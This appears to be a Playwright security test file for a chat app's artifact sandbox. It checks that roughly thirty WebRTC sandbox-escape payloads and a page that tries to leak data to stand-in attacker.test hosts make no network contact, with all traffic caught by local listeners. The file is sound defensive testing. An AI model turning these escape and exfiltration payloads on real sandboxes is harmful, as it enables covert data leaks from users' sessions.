// Artifact and HTML / SVG preview frames open no direct connections (docs/DECISIONS.md "Artifact frames: no direct
// connections"). Runs in Chromium and WebKit (playwright.config.ts). Everything stays on this machine: a UDP socket on
// 127.0.0.1 stands in for an attacker's STUN server, and name connections are seen by a local proxy that answers 502
// to everything (nothing is forwarded; full Chromium also gets --host-resolver-rules, so it resolves no name at all).
//
// 1. WebRTC: the receiver removes RTCPeerConnection & co. and stops every way back to a fresh realm (nested frames,
//    declarative shadow roots, HTML parsers, cloned shadow roots, window.open …). 24 of the escape cases below sent UDP
//    from an unguarded frame (the review's guard let four of them through); five (blob:, about:blank, window.open, <object>, a
//    worker) were already closed by the sandbox and CSP and stay as regression checks. The first test proves the
//    listener does hear an unguarded page.
// 2. Names: WebKit connects for <link rel=preconnect> and _blank clicks, full Chromium (Chrome, Edge) when a frame
//    navigates itself, whatever CSP says. In a confidential chat outside the desktop app the page is shown without
//    scripts and without anything that names a host; no name reaches the proxy, in WebKit and in full Chromium.
// 3. Ordinary artifacts keep working (scripts, onclick, web components, React with the vendor libraries, Mermaid).
import dgram from 'node:dgram'
import http from 'node:http'
import type { AddressInfo } from 'node:net'
import { chromium, expect, test, type Browser, type BrowserContext, type Page } from '@playwright/test'
import { wrapHtml } from '../../src/lib/artifacts'
import { reset, signIn } from './helpers'

const PORT = Number(process.env.MOCK_PORT ?? 19143)
const BASE = `http://127.0.0.1:${PORT}`

// ---------------- local listeners ----------------
let udp: dgram.Socket
let udpPort = 0
let udpHits = 0
let proxy: http.Server
let proxyPort = 0
const names: string[] = []

test.beforeAll(async () => {
  udp = dgram.createSocket('udp4')
  udp.on('message', () => udpHits++)
  await new Promise<void>((r) => udp.bind(0, '127.0.0.1', () => r()))
  udpPort = udp.address().port
  proxy = http.createServer((req, res) => {
    names.push(`${req.method} ${req.url}`)
    res.writeHead(502)
    res.end()
  })
  proxy.on('connect', (req, sock) => {
    sock.on('error', () => {})
    names.push(`CONNECT ${req.url}`)
    sock.end('HTTP/1.1 502 Bad Gateway\r\n\r\n')
  })
  proxy.on('connection', (s) => s.on('error', () => {}))
  await new Promise<void>((r) => proxy.listen(0, '127.0.0.1', () => r()))
  proxyPort = (proxy.address() as AddressInfo).port
})
test.afterAll(async () => {
  udp?.close()
  proxy?.close()
})

const attackerNames = () => [...new Set(names.filter((n) => /attacker\.test/.test(n)))]
const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms))

// ---------------- WebRTC escapes ----------------
const escAttr = (s: string) => s.replace(/&/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;')
const js = (v: string) => JSON.stringify(v).replace(/</g, '\\u003c')
/** opens a peer connection to the local UDP listener and says how it went */
const pc = (where: string) =>
  `try{var pc=new RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:PORT'}]});pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)});top.postMessage({probe:'${where}: made'},'*')}catch(e){top.postMessage({probe:'${where}: '+e.name},'*')}`
const nested = `<script>${pc('nested')}<\/script>`
const DSD = `<div><template shadowroot'+'mode=closed><iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe></template></div>`

/** The review's ten escapes (plans/web-exfil-2026-10-30/probes/review/guard-probe.mjs; the first is the analysis's own
 * case) and further ones found while building the guard. */
const ESCAPES: Record<string, string> = {
  // the analysis's case: WebRTC in the artifact's own window
  'same window': `<script>${pc('same')}</script>`,
  // review: nested frames are a fresh window with WebRTC back
  'srcdoc frame in the markup': `<iframe srcdoc="${escAttr(nested)}"></iframe>`,
  'srcdoc frame made by a script': `<script>var f=document.createElement('iframe');f.srcdoc=${js(nested)};document.body.appendChild(f)</script>`,
  'javascript: frame': `<iframe src="javascript:'${nested.replace(/'/g, "\\'")}'"></iframe>`,
  'blob: frame': `<script>var f=document.createElement('iframe');f.src=URL.createObjectURL(new Blob([${js(nested)}],{type:'text/html'}));document.body.appendChild(f)</script>`,
  'closed declarative shadow root': `<div><template shadowrootmode="closed"><iframe srcdoc="${escAttr(nested)}"></iframe></template></div>`,
  'setHTMLUnsafe with a declarative shadow root': `<div id=h></div><script>try{document.getElementById('h').setHTMLUnsafe('${DSD}')}catch(e){top.postMessage({probe:'setHTMLUnsafe: '+e.name},'*')}</script>`,
  'late document.write with a declarative shadow root': `<script>setTimeout(function(){try{document.write('<div><template shadowroot');document.write('mode=closed><iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe></template></div>')}catch(e){top.postMessage({probe:'write: '+e.name},'*')}},50)</script>`,
  'changed prototypes to blind a watcher': `<script>Element.prototype.remove=function(){};Element.prototype.matches=function(){return false};Element.prototype.querySelectorAll=function(){return []};Node.prototype.removeChild=function(n){return n};var f=document.createElement('iframe');f.srcdoc=${js(nested)};document.body.appendChild(f)</script>`,
  'closed attachShadow root': `<script>var h=document.createElement('div');document.body.appendChild(h);var s=h.attachShadow({mode:'closed'});s.innerHTML='<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>'</script>`,
  // found while building the guard (the review's guard let these through)
  'document.write during the first parse (two writes)': `<script>try{document.write('<div><template shadowroot');document.write('mode=closed><iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe></template></div>')}catch(e){top.postMessage({probe:'write: '+e.name},'*')}</script>`,
  'document.write finished by the markup after it': `<script>try{document.write('<div><template shadowroot')}catch(e){top.postMessage({probe:'write: '+e.name},'*')}</script>mode=closed><iframe srcdoc="${escAttr(nested)}"></iframe></template></div>`,
  'clone of a clonable closed shadow root': `<script>var h=document.createElement('div');var s=h.attachShadow({mode:'closed',clonable:true});s.innerHTML='<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>';document.body.appendChild(h.cloneNode(true))</script>`,
  'clone inside a bigger subtree': `<script>var h=document.createElement('span');var s=h.attachShadow({mode:'closed',clonable:true});s.innerHTML='<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>';var w=document.createElement('div');w.appendChild(h.cloneNode(true));document.body.appendChild(w)</script>`,
  'parseHTMLUnsafe with a declarative shadow root': `<script>try{var d=Document.parseHTMLUnsafe('${DSD}');document.body.appendChild(document.adoptNode(d.body.firstChild))}catch(e){top.postMessage({probe:'parseHTMLUnsafe: '+e.name},'*')}</script>`,
  'document.open over the page': `<script>try{document.open();document.write('<script>${pc('reopened').replace(/'/g, "\\'")}<\\/script>');document.close()}catch(e){top.postMessage({probe:'open: '+e.name},'*')}</script>`,
  'Object.prototype trap on the observer options': `<script>Object.defineProperty(Object.prototype,'attributeFilter',{get:function(){throw new Error('x')}});var h=document.createElement('div');document.body.appendChild(h);try{h.attachShadow({mode:'open'})}catch(e){}var s=h.shadowRoot;if(s)s.innerHTML='<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>'</script>`,
  'frame put back each time it is removed': `<script>var f=document.createElement('iframe');f.srcdoc=${js(nested)};var n=0;new MutationObserver(function(){if(!f.isConnected&&n++<200)document.body.appendChild(f)}).observe(document.body,{childList:true});document.body.appendChild(f)</script>`,
  'template content cloned in': `<template id=t><iframe srcdoc="${escAttr(nested)}"></iframe></template><script>document.body.appendChild(document.getElementById('t').content.cloneNode(true))</script>`,
  'insertAdjacentHTML': `<div id=d></div><script>document.getElementById('d').insertAdjacentHTML('beforeend','<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>')</script>`,
  'node adopted from DOMParser': `<script>var d=new DOMParser().parseFromString('<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>','text/html');document.body.appendChild(document.adoptNode(d.body.firstChild))</script>`,
  'custom element with a closed shadow root': `<x-e></x-e><script>customElements.define('x-e',class extends HTMLElement{constructor(){super();var s=this.attachShadow({mode:'closed'});s.innerHTML='<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>'}})</script>`,
  'execCommand insertHTML': `<div id=d contenteditable></div><script>document.getElementById('d').focus();document.execCommand('insertHTML',false,'<iframe srcdoc="'+${js(escAttr(nested))}+'"></iframe>')</script>`,
  // found in review: WebKit loads a javascript: URL given to window.open(…, '_self') as a new document in a fresh
  // window (Chromium refuses it; the frame's own location and links do nothing in either engine)
  'javascript: URL through window.open into the frame itself': `<script>setTimeout(function(){try{window.open(${js(`javascript:'${nested.replace(/'/g, "\\'")}'`)},'_self')}catch(e){top.postMessage({probe:'open: '+e.name},'*')}},50)</script>`,
  'frame inside SVG foreignObject':`<svg><foreignObject width=10 height=10><iframe xmlns="http://www.w3.org/1999/xhtml" srcdoc="${escAttr(nested)}"></iframe></foreignObject></svg>`,
  // closed by the sandbox and CSP already; kept so they stay closed
  'about:blank frame used from outside': `<script>var f=document.createElement('iframe');document.body.appendChild(f);try{var R=f.contentWindow.RTCPeerConnection;new R({iceServers:[{urls:'stun:127.0.0.1:PORT'}]}).createOffer();top.postMessage({probe:'blank: made'},'*')}catch(e){top.postMessage({probe:'blank: '+e.name},'*')}</script>`,
  'window.open': `<script>var w=window.open('about:blank');top.postMessage({probe:'open: '+(w?'window':'null')},'*');if(w)try{new w.RTCPeerConnection({iceServers:[{urls:'stun:127.0.0.1:PORT'}]}).createOffer()}catch(e){}</script>`,
  'object with an HTML document': `<object type="text/html" data="data:text/html,${encodeURIComponent(nested)}"></object>`,
  'worker': `<script>try{var w=new Worker(URL.createObjectURL(new Blob(['postMessage(typeof RTCPeerConnection+"/"+typeof WebTransport)'])));w.onmessage=function(e){top.postMessage({probe:'worker: '+e.data},'*')}}catch(e){top.postMessage({probe:'worker: '+e.name},'*')}</script>`,
}

/** Renders a document in a sandbox frame exactly like components/SandboxFrame.tsx (the server's receiver, the web
 * app's wrapHtml) and collects what it reported. */
async function render(page: Page, body: string, wait = 1200): Promise<string[]> {
  const html = wrapHtml(body.replaceAll('PORT', String(udpPort)), BASE)
  return page.evaluate(
    async ({ html, wait }) => {
      const probes: string[] = []
      const f = document.createElement('iframe')
      f.setAttribute('sandbox', 'allow-scripts')
      f.src = '/sandbox/frame?v=exfil'
      const onMessage = (e: MessageEvent) => {
        const d = e.data as { source?: string; type?: string; probe?: unknown; message?: string } | null
        if (e.source === f.contentWindow && d?.source === 'mycel-frame' && d.type === 'ready') f.contentWindow!.postMessage({ source: 'mycel-host', type: 'render', html }, '*')
        else if (typeof d?.probe === 'string') probes.push(d.probe)
        else if (d?.source === 'mycel-frame' && d.type === 'error') probes.push(`error: ${d.message}`)
      }
      window.addEventListener('message', onMessage)
      document.body.appendChild(f)
      await new Promise((r) => setTimeout(r, wait))
      window.removeEventListener('message', onMessage)
      f.remove()
      return probes
    },
    { html, wait },
  )
}

test.describe('WebRTC never leaves an artifact frame', () => {
  test.describe.configure({ mode: 'serial' })
  let page: Page
  test.beforeAll(async ({ browser }) => {
    page = await browser.newPage({ baseURL: BASE })
    await reset(page)
    await signIn(page)
  })
  test.afterAll(async () => page?.close())

  test('control: an unguarded page does reach a local UDP listener', async () => {
    // a socket of its own: this connection keeps sending (STUN retries) while the next tests count
    const control = dgram.createSocket('udp4')
    let hits = 0
    control.on('message', () => hits++)
    await new Promise<void>((r) => control.bind(0, '127.0.0.1', () => r()))
    try {
      await page.evaluate((port) => {
        const c = new RTCPeerConnection({ iceServers: [{ urls: `stun:127.0.0.1:${port}` }] })
        ;(window as unknown as { __control: RTCPeerConnection }).__control = c
        c.createDataChannel('x')
        void c.createOffer().then((o) => c.setLocalDescription(o))
      }, control.address().port)
      await expect.poll(() => hits, { timeout: 5000 }).toBeGreaterThan(0)
      await page.evaluate(() => (window as unknown as { __control: RTCPeerConnection }).__control.close())
    } finally {
      control.close()
    }
  })

  for (const [name, body] of Object.entries(ESCAPES)) {
    test(`escape: ${name}`, async () => {
      udpHits = 0
      const probes = await render(page, body)
      expect(udpHits, `UDP from "${name}" (${probes.join(' | ')})`).toBe(0)
      expect(probes.filter((p) => p.endsWith(': made'))).toEqual([])
    })
  }

  test('the frame has no WebRTC, WebTransport or camera, and a worker has none either', async () => {
    const probes = await render(page, `<script>top.postMessage({probe:[typeof RTCPeerConnection,typeof RTCDataChannel,typeof RTCSessionDescription,typeof WebTransport,typeof navigator.mediaDevices].join()},'*')</script>`)
    expect(probes).toContain('undefined,undefined,undefined,undefined,undefined')
  })

  test('what the guard turns off says so (a clear error, not a silent failure)', async () => {
    const probes = await render(page, ESCAPES['document.write during the first parse (two writes)']!)
    expect(probes).toContain('write: TypeError')
    const all = await render(page, `<script>try{document.write('x')}catch(e){top.postMessage({probe:e.message},'*')}</script>`)
    expect(all).toContain('document.write is turned off in artifacts')
  })

  test('ordinary pages still work: inline scripts, onclick, web components with open or closed shadow roots, canvas', async () => {
    const probes = await render(
      page,
      `<div id=o>before</div><button id=b onclick="top.postMessage({probe:'onclick ran'},'*')">x</button><x-open></x-open><x-closed></x-closed><canvas id=c width=4 height=4></canvas>
<script>
document.getElementById('o').textContent='after';top.postMessage({probe:'inline ran: '+document.getElementById('o').textContent},'*');
document.getElementById('b').click();
customElements.define('x-open',class extends HTMLElement{constructor(){super();const shadowRoot=this.attachShadow({mode:'open'});shadowRoot.innerHTML='<b>open ok</b>'}});
customElements.define('x-closed',class extends HTMLElement{constructor(){super();this.attachShadow({mode:'closed'}).innerHTML='<i>closed ok</i>'}});
top.postMessage({probe:'shadow: '+document.querySelector('x-open').shadowRoot.textContent+' / '+document.querySelector('x-closed').shadowRoot},'*');
var x=document.getElementById('c').getContext('2d');x.fillRect(0,0,4,4);top.postMessage({probe:'canvas: '+x.getImageData(0,0,1,1).data[3]},'*');
document.body.insertAdjacentHTML('beforeend','<p id=late>late</p>');top.postMessage({probe:'insert: '+document.getElementById('late').textContent},'*');
</script>`,
    )
    expect(probes).toEqual(expect.arrayContaining(['inline ran: after', 'onclick ran', 'shadow: open ok / null', 'canvas: 255', 'insert: late']))
    expect(probes.filter((p) => p.startsWith('error:'))).toEqual([])
  })
})

// ---------------- names: confidential chats ----------------
const NAME = (tag: string) => `${tag}-c2vjcmv0.attacker.test`
/** Everything that made WebKit or full Chromium connect to a name from a scripted frame, plus a page that would show
 * whether its scripts ran and whether its styles survived. */
const LEAKY_PAGE = `<style>h1{color:rgb(1, 2, 3)}</style>
<h1 id="t">Static page</h1>
<noscript><p id="ns">shown without scripts</p></noscript>
<link rel="preconnect" href="https://${NAME('pc')}">
<link rel="dns-prefetch" href="https://${NAME('dp')}">
<meta http-equiv="refresh" content="0;url=https://${NAME('refresh')}/x">
<a id="a" target="_blank" href="https://${NAME('blank')}/x">open</a>
<a id="self" href="https://${NAME('self')}/x">go</a>
<iframe src="https://${NAME('frame')}/x"></iframe>
<form action="https://${NAME('form')}/x"><button id="send">send</button></form>
<svg width="40" height="40"><a href="https://${NAME('svg')}/"><rect id="r" width="40" height="40" fill="rgb(4, 5, 6)"/></a><set attributeName="href" to="https://${NAME('smil')}/"/></svg>
<img id="dot" alt="dot" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
<script>document.getElementById('t').textContent += ' (ran)'; document.getElementById('a').click(); document.body.insertAdjacentHTML('beforeend', '<link rel=preconnect href=https://late-c2vjcmv0.attacker.test>'); for (var i = 0; i < 3; i++) location.href = 'https://nav' + i + '-c2vjcmv0.attacker.test/x'</script>`

async function ask(page: Page, text: string) {
  await page.getByTestId('composer-input').fill(text)
  await page.getByTestId('send').click()
}
const setArtifact = async (page: Page, type: 'html' | 'svg' | 'react' | 'mermaid', content: string) =>
  expect((await page.request.post('/__test/artifact', { data: { type, content } })).ok()).toBeTruthy()

/** The confidential HTML artifact, shown and clicked; returns the names the proxy saw meanwhile. */
async function staticArtifactNames(page: Page): Promise<string[]> {
  await reset(page)
  await signIn(page)
  names.length = 0
  await setArtifact(page, 'html', LEAKY_PAGE)
  await ask(page, 'make a confidential artifact')
  const panel = page.getByTestId('artifact-panel')
  await expect(panel.getByTestId('static-notice')).toBeVisible()
  await expect(panel.locator('[data-testid="sandbox-frame"]')).toHaveCount(0)
  const f = page.frameLocator('[data-testid="static-frame"]')
  await expect(f.locator('h1')).toHaveText('Static page')
  await expect(f.locator('h1')).toHaveCSS('color', 'rgb(1, 2, 3)')
  await expect(f.locator('#ns')).toHaveText('shown without scripts')
  await expect(f.locator('#dot')).toBeVisible()
  await expect(f.locator('#r')).toHaveAttribute('fill', 'rgb(4, 5, 6)')
  // nothing that names a host is left, and a person's clicks go nowhere
  await expect(f.locator('link, meta[http-equiv="refresh"], iframe, script, set, form[action]')).toHaveCount(0)
  for (const sel of ['#a', '#self']) {
    await expect(f.locator(sel)).not.toHaveAttribute('href', /./)
    await expect(f.locator(sel)).not.toHaveAttribute('target', /./)
  }
  await f.locator('#a').click()
  await f.locator('#self').click()
  await f.locator('#r').click({ force: true })
  await f.locator('#send').click()
  await sleep(1500)
  await expect(f.locator('h1')).toHaveText('Static page')
  return attackerNames()
}

/** proves the proxy sees this context's connections: a top-level page to a name does go through it */
async function proxyControl(context: BrowserContext) {
  const p = await context.newPage()
  await p.goto(`https://${NAME('control')}/`).catch(() => {})
  await p.close()
  expect(attackerNames()).toContain(`CONNECT ${NAME('control')}:443`)
}

test.describe('confidential chat: no names leave a static view', () => {
  test.describe.configure({ mode: 'serial' })

  test('this engine (Chromium headless shell / WebKit): nothing runs, nothing names a host', async ({ browser }) => {
    const context = await browser.newContext({ baseURL: BASE, proxy: { server: `http://127.0.0.1:${proxyPort}`, bypass: '127.0.0.1' } })
    try {
      const page = await context.newPage()
      expect(await staticArtifactNames(page)).toEqual([])
      await proxyControl(context)
    } finally {
      await context.close()
    }
  })

  test('full Chromium (what Chrome and Edge run): nothing runs, nothing names a host', async ({ browserName }) => {
    test.skip(browserName !== 'chromium', 'Chromium only')
    // The full build talks to Google services on its own: behind the local proxy (which forwards nothing) and with
    // every name resolving to "not found", none of that leaves this machine either.
    let full: Browser | null = null
    try {
      full = await chromium.launch({ channel: 'chromium', proxy: { server: `http://127.0.0.1:${proxyPort}`, bypass: '127.0.0.1' }, args: ['--host-resolver-rules=MAP * ~NOTFOUND , EXCLUDE 127.0.0.1'] })
      const context = await full.newContext({ baseURL: BASE, locale: 'ko-KR', viewport: { width: 1360, height: 860 } })
      const page = await context.newPage()
      expect(await staticArtifactNames(page)).toEqual([])
      await proxyControl(context)
    } finally {
      await full?.close()
    }
  })
})

// ---------------- the static view and ordinary chats, through the app ----------------
test.describe('artifacts in the app', () => {
  test('ordinary chat: an HTML artifact runs its scripts, onclick handlers and web components', async ({ page }) => {
    await reset(page)
    await signIn(page)
    await setArtifact(page, 'html', `<h1 id=t>Hello</h1><button id=b onclick="this.textContent='clicked'">go</button><x-c></x-c><script>document.getElementById('t').textContent+=' (ran)';customElements.define('x-c',class extends HTMLElement{constructor(){super();this.attachShadow({mode:'open'}).innerHTML='<b>shadow ok</b>'}})</script>`)
    await ask(page, 'make an artifact')
    const f = page.frameLocator('[data-testid="artifact-panel"] [data-testid="sandbox-frame"]')
    await expect(f.locator('h1')).toHaveText('Hello (ran)')
    await f.locator('#b').click()
    await expect(f.locator('#b')).toHaveText('clicked')
    await expect(f.locator('x-c b')).toHaveText('shadow ok')
    await expect(page.getByTestId('static-notice')).toHaveCount(0)
  })

  test('ordinary chat: a React artifact runs with the vendor libraries', async ({ page }) => {
    await reset(page)
    await signIn(page)
    await ask(page, 'make a react counter')
    const f = page.frameLocator('[data-testid="artifact-panel"] iframe')
    await expect(f.getByRole('button')).toContainText('count 0', { timeout: 15_000 })
    await f.getByRole('button').click()
    await expect(f.getByRole('button')).toContainText('count 1')
    await expect(f.getByRole('button')).toHaveCSS('color', 'rgb(255, 255, 255)')
  })

  test('ordinary chat: Mermaid and SVG artifacts draw in the frame', async ({ page }) => {
    await reset(page)
    await signIn(page)
    await setArtifact(page, 'mermaid', 'graph TD; A[Start]-->B[Done]')
    await ask(page, 'make a diagram artifact')
    await expect(page.frameLocator('[data-testid="artifact-panel"] iframe').locator('#out svg')).toBeVisible({ timeout: 15_000 })
    await expect(page.getByTestId('assistant-message').last()).toHaveAttribute('data-status', 'done')
    await setArtifact(page, 'svg', '<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60"><circle id="c" cx="30" cy="30" r="20" fill="rgb(7, 8, 9)"/></svg>')
    await ask(page, 'make an svg artifact')
    await expect(page.frameLocator('[data-testid="artifact-panel"] iframe').locator('#c')).toHaveAttribute('fill', 'rgb(7, 8, 9)')
  })

  test('confidential chat: React needs scripts and says so, Mermaid is drawn by the app, SVG is shown without scripts', async ({ page }) => {
    await reset(page)
    await signIn(page)
    await ask(page, 'make a confidential react counter')
    const panel = page.getByTestId('artifact-panel')
    await expect(panel.getByTestId('static-notice')).toContainText('데스크톱 앱')
    await expect(panel.locator('iframe')).toHaveCount(0)
    await panel.getByRole('tab', { name: '코드' }).click()
    await expect(panel.locator('code')).toContainText('useState')
    await expect(page.getByTestId('assistant-message').last()).toHaveAttribute('data-status', 'done')
    await setArtifact(page, 'mermaid', 'graph TD; A[Start]-->B[Done]')
    await ask(page, 'make a diagram artifact')
    await expect(panel.getByRole('img').locator('svg')).toBeVisible({ timeout: 15_000 })
    await expect(panel.locator('iframe')).toHaveCount(0)
    await expect(page.getByTestId('assistant-message').last()).toHaveAttribute('data-status', 'done')
    await setArtifact(page, 'svg', '<svg xmlns="http://www.w3.org/2000/svg" width="60" height="60"><circle id="c" cx="30" cy="30" r="20" fill="rgb(7, 8, 9)"/><script>document.getElementById("c").setAttribute("fill","red")</script></svg>')
    await ask(page, 'make an svg artifact')
    const f = page.frameLocator('[data-testid="static-frame"]')
    await expect(f.locator('#c')).toHaveAttribute('fill', 'rgb(7, 8, 9)')
    await expect(f.locator('script')).toHaveCount(0)
  })

  test('confidential chat in the desktop app: scripts run (its shell opens no such connections)', async ({ page }) => {
    await page.addInitScript(() => {
      const noop = () => {}
      ;(window as unknown as { mycelDesktop: unknown }).mycelDesktop = {
        bridgeVersion: 1, appVersion: '0.2.10', platform: 'darwin',
        browser: { run: async (c: { callId: string }) => ({ callId: c.callId, ok: false, content: [], error: 'no pane' }), cancel: noop },
        pane: { open: noop, close: noop, toggle: noop, getState: async () => ({ open: false, tabs: [], driving: false }), onState: () => noop },
        connection: { get: async () => ({ route: 'remote', origin: location.origin, teamAddress: location.origin, fingerprintMismatch: false }), onChange: () => noop },
        notify: noop, openTeams: noop, setLocale: noop,
      }
    })
    await reset(page)
    await signIn(page)
    await ask(page, 'make a confidential artifact')
    await expect(page.frameLocator('[data-testid="artifact-panel"] [data-testid="sandbox-frame"]').locator('h1')).toHaveText('Hello artifact (ran)')
    await expect(page.getByTestId('static-notice')).toHaveCount(0)
  })

  test('HTML file preview: scripts run normally, not while every chat is confidential (Safe operations 1A on)', async ({ page }) => {
    await reset(page)
    await signIn(page)
    await page.goto('/files?path=marketing')
    const open = () => page.getByTestId('file-row').filter({ hasText: 'page.html' }).getByRole('button').first().click()
    await open()
    await expect(page.frameLocator('[data-testid="file-panel"] [data-testid="sandbox-frame"]').locator('body')).toContainText('ran')
    expect((await page.request.post('/__test/confidential', { data: { all: true } })).ok()).toBeTruthy()
    await page.reload()
    await open()
    const f = page.frameLocator('[data-testid="file-panel"] [data-testid="static-frame"]')
    await expect(f.locator('h1')).toHaveText('Hi')
    await expect(page.getByTestId('file-panel').getByTestId('static-notice')).toBeVisible()
    await sleep(300)
    await expect(f.locator('body')).not.toContainText('ran')
  })
})
